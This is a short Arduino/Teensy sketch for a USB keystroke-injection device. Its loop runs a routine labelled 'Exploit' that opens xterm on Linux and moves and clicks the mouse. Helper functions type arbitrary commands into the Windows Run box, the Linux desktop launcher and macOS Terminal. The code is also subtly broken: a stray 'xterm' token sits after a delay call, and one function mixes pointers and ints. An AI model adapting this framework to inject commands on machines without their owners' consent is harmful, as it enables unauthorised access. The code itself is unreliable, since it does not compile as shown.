int ledPin = 11;
int windows = 2;

void setup(){
}

void loop(){
  // Start
  delay(1000);
  digitalWrite(ledPin, HIGH);

  // Exploit
  LinuxPayload();

  // End
  digitalWrite(ledPin, LOW);
  delay(15000); // Long delay between runs
}

void goDirection(int *sx, int *sy, int *x, int *y){
  for(int i = sx; i<x; i++){
    Mouse.move(i, 2);
    delay(25);
  }
}

// Specific functions
void LinuxPayload(){
  GnomeKDECommandRun("xterm");
  delay(1500);
  KeyCombo(MODIFIERKEY_ALT,KEY_F7);
  int i;
  for (i=0; i<900; i++){
    Mouse.move(2, 2);
    delay(25);
  }
  Mouse.click();
}

// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void GnomeKDECommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_ALT,KEY_F2);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void AppleCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_SPACE); // "apple" aka command key, space key -- open spotlight
  delay(1500);
  Keyboard.print("Terminal.app");
  delay(1000);xterm
  
  KeyPress(KEY_ENTER);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

